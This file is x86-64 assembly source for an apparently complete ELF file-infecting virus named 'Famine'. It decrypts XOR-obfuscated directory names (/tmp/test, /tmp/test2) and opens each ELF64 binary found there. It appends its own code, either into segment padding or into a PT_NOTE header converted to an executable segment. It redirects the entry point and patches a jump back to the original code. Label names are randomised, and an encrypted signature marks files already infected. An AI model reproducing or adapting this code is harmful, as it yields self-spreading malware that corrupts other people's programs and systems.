; %include "famine.inc"
%include "obf_file.inc"

bits 64 
default rel

section .text
global _start

_start:
; placing famine on the stack
push rbp
mov rbp, rsp
PUSHA
lea rdi, [rel qlUu2B8x]     ; dir to open for arg readDir
mov rsi, rtudUYK25
call PtnTUBP

lea rdi, [rel an3sFBeja]
mov rsi, UJO48 
call PtnTUBP
uvWbbqK:
POPA
mov rsp, rbp
pop rbp
EGhECZkfl:
jmp IJNcg

; take directory to open in rdi && size of pwd on rsi
PtnTUBP:
push rbp
mov rbp, rsp
push rax
push rsi
call sAEuEQB9Dw
mov rdi, rax
pop rsi
pop rax
sub rsp, famine_size
push rsi
lea r8, FAM(famine.fd)
or qword [r8], -1
lea r8, FAM(famine.pwdPtr)
; mov r10, [rdi]
mov [r8], rdi
lea r8, FAM(famine.lenghtPwd)
mov [r8], rsi
mov rax, 2
mov rsi, 0x0000| O_DIRECTORY 
xor rdx, rdx
syscall
cmp rax, 0 
pop rsi        ; Get the string size back to unmap
jl NWZIM 
lea rdi, FAM(famine.fd)             ; enregistre le fd dans la struct
mov [rdi], rax

zt7ThRp:
lea r10, FAM(famine.fd)
mov rdi, [r10]
lea r9, FAM(famine.total_read)              ; init total_read
mov DWORD[r9], 0 
mov rax, 217; getdents64(int fd, void *buf, size_t size_buf) 
lea rsi, FAM(famine.dirents)
mov rdx, 0x1000
syscall
cmp rax, 0 
jle NWZIM 

lea r10, FAM(famine.dirents_struct_ptr)  ; r10 -> (struct famine.diretents_struct_ptr)
mov [r10], rsi                           ; famine.dirents_struct_ptr -> famine.dirents
lea r11, FAM(famine.total_to_read)       ; r11 -> (struct famine.total_to_read)
mov DWORD [r11], eax ; famine.total_to_read = getdents total length 

QPhAeuCjxB:
lea r8, FAM(famine.total_read)        ; r8 -> total lu de getdents
lea r9, FAM(famine.total_to_read)        ; r9 -> total a lire de getdents
mov r10, FAM(famine.dirents_struct_ptr)  ; r10 -> actual dirent struct
lea r11, FAM(famine.dirents_struct_ptr)  ; r11 -> ptr de la struct actuelle
movzx r12, WORD [r10 + D_RECLEN_OFF] ; r12 = length de la stuct dirents actuelle 
add [r8], r12d                          ; update du total lu dans r8
add [r11], r12                           ; famine.diretns_struct_ptr -> sur la prochaine struct
cmp BYTE [r10 + D_TYPE], 0x8; verifie le type du fichier 
jne cZWvY6f

qNsNU3kz:
lea rsi, [r10 + D_NAME] ; charge le nom du fichier dans rsi 
mov byte [rsi - 1], '/'
sub rsi, FAM(famine.lenghtPwd)
mov rdi, FAM(famine.pwdPtr)
call jSDEvyc9DI

GxAnmS:
call iAgRjLWCOg

cZWvY6f:
mov r8, FAM(famine.total_read)
mov r12, FAM(famine.total_to_read)
cmp r8d, r12d                   ; if (total lu >= total getdents)
mov rdi, FAM(famine.pwdPtr)
mov rsi, FAM(famine.lenghtPwd)
jge zt7ThRp
jmp QPhAeuCjxB

iAgRjLWCOg:
push rbp
mov rbp, rsp
sub rsp, infection_size
lea rax, INF(infection.injection_offset)
mov qword [rax], 0 
lea rax, INF(infection.add_page)
mov byte [rax], 0 
lea rax, INF(infection.mem_eof)
mov qword [rax], 0 

Mo5QprAKlk:
mov rax, 2
mov rdi, rsi
mov rsi, 0x0002
xor rdx, rdx
syscall
cmp rax, 0x0 
jl ZY7TcKY2rP
mov INF(infection.file_fd), rax

; === get file size ===
SFdKb:
mov rax, 8
mov rdi, INF(infection.file_fd)
mov rsi, 0x0 
mov rdx, 0x2
syscall
cmp rax, 0x0 
jle ewPwsT
mov INF(infection.map_size), rax
mov INF(infection.original_end), rax

WvUHqXk:
; rax -> map
mov rsi, rax        ; rsi = file_size
mov rax, 9
mov rdi, 0x0 
mov rdx, 2| 4| 1
mov r10, 1
mov r8, INF(infection.file_fd)
mov r9, 0x0 
syscall
cmp rax, 0x0 ; rax -> map (used later) 
jl ewPwsT
lea r8, INF(infection.map_addr)
mov [r8], rax

DuG7HGBxY:
cmp dword [rax + 1], 0x02464c45 ; if != 'ELF64' 
jne KPBBE 

Leevipzgem:
; rax == total segment number
; r9 == injection offset
; r13 == original segment end offset
; r14 -> header table
; r15 -> map
mov r15, rax
mov r14, r15
add r14, [r14 + elf64_ehdr.e_phoff]
xor rcx, rcx
jONRAmwjRC:
cmp cx, [r15  + elf64_ehdr.e_phnum]
jge RCpY1EAd 
add r14, elf64_phdr_size
inc rcx
jmp jONRAmwjRC
RCpY1EAd:
mov INF(infection.last_seg_hdr_addr), r14
xor r9, r9
GAcm49m:
cmp cx, 0 
jle WxrgmVJ
T4NLFcV:
bt word [r14], 0 ; is segment header's first bit != 0 
jnc MOJ3yG3
bt qword [r14], 0x20 ; is segment header's 33rd bit == 1 
jc VVUB0X 
MOJ3yG3:
dec rcx
sub r14, elf64_phdr_size
jmp GAcm49m

WxrgmVJ:
mov r9, INF(infection.injection_offset)
cmp r9, 0 
je KPBBE 
cmp byte INF(infection.add_page), 1 ; if new page needed jump _add page 
je tN0ZI0I1
jmp j0MMr          ; else jmp j0MMr

VVUB0X:
; Check if the segment signed, else check the size, if big enough save the offsets if not already done
ttxfPt8:
; r8 -> potential myGCH
; r9 == myGCH variable
mov r8, r15
add r8, [r14 + elf64_phdr.p_offset]
add r8, [r14 + elf64_phdr.p_filesz]
sub r8, bUlvxUCnC
mov r9, [rel myGCH]
mov rdi, r9
mov r8, bUlvxUCnC
mov rsi, r8
push rax
call sAEuEQB9Dw
mov r9, rax
pop rax
cmp qword r9, [r8]
je KPBBE 
mov rdi, r9
mov rsi, bUlvxUCnC
call R5kbT4ncVK

h6U27Bye79:
mov r9, INF(infection.injection_offset)
test r9, r9
jz PLktR6B
mov r9, INF(infection.add_page)
test r9, r9
jz MOJ3yG3

PLktR6B:
; r8 == end of infection offset
; r9 == next segment offset
mov r8, [r14 + elf64_phdr.p_offset]
add r8, [r14 + elf64_phdr.p_filesz]
mov r13, r8        ; save segment end's offset
add r8, CODE_LEN 
mov r9, r14
add r9, elf64_phdr_size
add r9, elf64_phdr.p_offset
cmp [r9], r8
setb INF(infection.add_page)   ; if ([r9] < r8) { infection.add_page = 1) }

P0XAOJ:
; r8 -> infection structure members
; r9 == injection address
; r12 == original entrypoint
;*r13 == segment end's offset (PLktR6B)
;*r14 -> segment header in header table
lea r8, INF(infection.seg_nb)
mov [r8], cl
lea r8, INF(infection.original_entry)
mov r12, [r15 + elf64_ehdr.e_entry]
mov [r8], r12
lea r8, INF(infection.injection_offset)
mov [r8], r13
lea r8, INF(infection.injection_addr)
push r9
mov r9, [r14 + elf64_phdr.p_vaddr]
add r9, [r14 + elf64_phdr.p_memsz]
mov [r8], r9
pop r9
lea r8, INF(infection.seg_hdr_addr)
mov [r8], r14
jmp MOJ3yG3

tN0ZI0I1:
B8ys7AC:
mov rax, 77
mov rdi, INF(infection.file_fd)
lea rsi, INF(infection.map_size)
push qword [rsi]
add qword [rsi], 0x1000
and qword [rsi], -4096
add qword [rsi], CODE_LEN 
mov rsi, [rsi]
syscall
pop rsi
cmp rax, 0 
jl KPBBE 

grlCeCJ:
mov rdi, INF(infection.map_addr)
mov rax, 11
syscall

gebQxWsAy:
mov rax, 9
mov rdi, 0x0 
mov rsi, INF(infection.map_size)    ; rsi = file_size
mov rdx, 2| 4| 1
mov r10, 1
mov r8, INF(infection.file_fd)
mov r9, 0x0 
syscall
cmp rax, 0x0 ; rax -> map (used later) 
jl ewPwsT
lea r8, INF(infection.map_addr)
mov [r8], rax

T54pJaFV:
mov r14, INF(infection.map_addr)
movzx rax, word [r14 + elf64_ehdr.e_shnum]
add r14, [r14 + elf64_ehdr.e_shoff]
xor rcx, rcx

B4wAq:
cmp rcx, rax
jge cptXG0rt
mov rbx, [r14 + elf64_shdr.sh_addr]
add rbx, [r14 + elf64_shdr.sh_size]
cmp INF(infection.mem_eof), rbx
jge fexyV
mov INF(infection.mem_eof), rbx

fexyV:
add r14, elf64_shdr_size
inc rcx
jmp B4wAq

cptXG0rt:

c1govs:
; r14 -> segmentS header
; rcx == segment counter
mov r14, INF(infection.map_addr)
movzx rax, word [r14 + elf64_ehdr.e_phnum]
add r14, [r14 + elf64_ehdr.e_phoff]
xor rcx, rcx

j8sBVA3Ee:
cmp rcx, rax
jge yNSdx
cmp dword [r14 + elf64_phdr.p_type], 0x4
je PDCAkkhJm5

Ukxest5m4S:
add r14, elf64_phdr_size
inc rcx
jmp j8sBVA3Ee

yNSdx:
mov r14, -1 ; detect if no note found. See PDCAkkhJm5 line 1 

PDCAkkhJm5:
; r14 -> segment header
; rax == new offset / address
cmp r14, 0 
jl BmHnos
mov dword [r14 + elf64_phdr.p_type], 0x1
mov qword [r14 + elf64_phdr.p_flags], 0x1| 0x4
mov qword [r14 + elf64_phdr.p_filesz], CODE_LEN 
mov qword [r14 + elf64_phdr.p_memsz], CODE_LEN 
mov qword [r14 + elf64_phdr.p_align], 0x1000 
mov rax, INF(infection.original_end)
add rax, 0x1000 
and rax, -4096
mov qword [r14 + elf64_phdr.p_offset], rax
mov qword INF(infection.injection_offset), rax
mov rax, INF(infection.mem_eof)
add rax, 0x1000 
and rax, -4096
mov qword INF(infection.injection_addr), rax
mov qword [r14 + elf64_phdr.p_vaddr], rax
mov qword [r14 + elf64_phdr.p_paddr], rax

j0MMr:
RzoTJpBy:
; r8 -> elf header entrypoint
; r9 == end of segment + align (injection offset)
; r10 == injection offset
mov r8, INF(infection.map_addr)
add r8, elf64_ehdr.e_entry
mov r10, INF(infection.injection_addr)
mov [r8], r10
cmp byte INF(infection.add_page), 0 
jg YhCJMxdE
mov rdi, CODE_LEN 
call dnpJlF

YhCJMxdE:
; rdi -> injection start
; rsi -> parasite _start
; rcx == code len (pbnliJXjh - _start)
mov rdi, INF(infection.map_addr)
add rdi, INF(infection.injection_offset)
lea rsi, [rel _start]     ; rsi -> start of our code
mov rcx, CODE_LEN ; counter will decrement 
cld          ; copy from _start to pbnliJXjh (= !std)
rep movsb

BmHnos:
; r8 -> EGhECZkfl instruction's addr (EGhECZkfl + 1)
; r9 == distance to jump from final jump to original entry point
mov r8, INF(infection.map_addr)
add r8, INF(infection.injection_offset)
add r8, FINJMP_OFF 
inc r8
mov r10, INF(infection.injection_addr)
add r10, FINJMP_OFF 
add r10, 0x05 
mov r9, INF(infection.original_entry)
sub r9, r10
mov [r8], r9d
jmp KPBBE 

dnpJlF:
; r8 -> segment header data
;*r14 -> segment header in header table

mov r8, INF(infection.seg_hdr_addr)
push r8           ; save header start for later

; * Update file size *
add r8, qword elf64_phdr.p_filesz
add qword [r8], rdi
pop r8

; * Update memory size *
add r8, elf64_phdr.p_memsz
add qword [r8], rdi

ret

KPBBE:
lea rdi, INF(infection.map_addr)
lea rsi, INF(infection.map_size)
call R5kbT4ncVK
jmp ewPwsT

R5kbT4ncVK:
mov rax, 11
syscall
ret

ewPwsT:
mov rax, 3
mov rdi, INF(infection.file_fd)
syscall
mov qword INF(infection.file_fd), -1
jmp ZY7TcKY2rP

NWZIM:
mov rdi, FAM(famine.fd)
cmp rdi, 0 
jle ZY7TcKY2rP
mov rax, 3
syscall
mov rdi, FAM(famine.pwdPtr)
mov rsi, FAM(famine.lenghtPwd)
call R5kbT4ncVK
or qword FAM(famine.fd), -1
jmp ZY7TcKY2rP

ZY7TcKY2rP:
leave
ret

IJNcg:
mov rax, 60 
xor rdi, rdi
syscall

;strcpy(dst:rsi src: rdi) (without /0 at the end)
jSDEvyc9DI:
xor rcx, rcx
ZuAwSjN:
cmp byte [rdi + rcx], 0 
je vIHcK
mov al, byte [rdi + rcx]
mov [rsi + rcx], al
add rcx, 1 
jmp ZuAwSjN

vIHcK:
; mov byte [rsi + rcx], 0 
ret

; rax: char *_decrypt_str(rsi: char *to_decrypt, rdi: len)
sAEuEQB9Dw:
; rax == div quotient
; rbx -> to_decrypt
; rcx == counter
; rdx == div modulo
; r9 == len I97wLFdha8
; r10 -> key_char
; r11 -> decrypted str (mmap)
; r12 == len to_decrypt
; rsi -> I97wLFdha8
push rbx
push rcx
push rdx
push r8
push r9
push r10
push r11
push r12
mov rbx, rdi
mov r12, rsi
xor rdi, rdi ; addr = NULL (let kernel choose) 
mov rdx, 0x03 ; 2| 4= 1 | 2 = 3 
mov r10, 0x22 ; MAP_PRIVATE | MAP_ANONYMOUS = 0x2 | 0x20 = 0x22 
mov r8, -1                      ; fd = -1
xor r9, r9 ; offset = 0 
mov rax, 9 ; syscall number for mmap 
syscall
cmp rax, 0 
jl JqQmgmH5TW
mov r11, rax
lea rsi, I97wLFdha8
call QQSvTzTpx
mov r9, rax
xor rcx, rcx
xor rdx, rdx
lF4Eri:
cmp rcx, r12
jge JqQmgmH5TW
mov rax, rcx
xor rdx, rdx
cmp rcx, 0 
jne HEFbQs
xor rax, rax
jmp IDF9Y 
HEFbQs:
div r9
IDF9Y:
movzx r10, byte [rsi + rdx] ; r10 == key[rcx % key_len]
xor r10b, [rbx + rcx]
mov [r11 + rcx], r10b
inc rcx
jmp lF4Eri
JqQmgmH5TW:
mov rax, r11
pop r12
pop r11
pop r10
pop r9
pop r8
pop rdx
pop rcx
pop rbx
ret

; debug
; strlen(str:rsi)
QQSvTzTpx:
xor rcx, rcx

gG5sUyjK:
cmp byte [rsi + rcx], 0 
je GGudW
inc rcx
jmp gG5sUyjK

GGudW:
mov rax, rcx
ret


qlUu2B8x db 0x69, 0x23, 0x0F, 0x28, 0x0B, 0x4C, 0x16, 0x09, 0x22, 0x6A 
rtudUYK25    equ $ - qlUu2B8x
an3sFBeja db 0x69, 0x23, 0x0F, 0x28, 0x0B, 0x4C, 0x16, 0x09, 0x22, 0x58, 0x62 
UJO48 equ $ - an3sFBeja 
I97wLFdha8 db 0x46, 0x57, 0x62, 0x58, 0x24, 0x38, 0x73, 0x7A, 0x56, 0x6A, 0x62, 0x35 
wWRckDe0w db 0x44, 0x22, 0x22, 0x22, 0x22, 0x00 
myGCH db 0x00, 0x36, 0x0F, 0x31, 0x4A, 0x5D, 0x53, 0x0C, 0x33, 0x18, 0x11, 0x5C, 0x29, 0x39, 0x42, 0x69, 0x0A, 0x08, 0x53, 0x52, 0x35, 0x43, 0x0D, 0x51, 0x23, 0x33, 0x42, 0x3A, 0x5D, 0x18, 0x12, 0x14, 0x20, 0x03, 0x0C, 0x56, 0x23, 0x39, 0x4F, 0x3D, 0x41, 0x5C, 0x0A, 0x7A 
bUlvxUCnC equ $ - myGCH
pbnliJXjh: 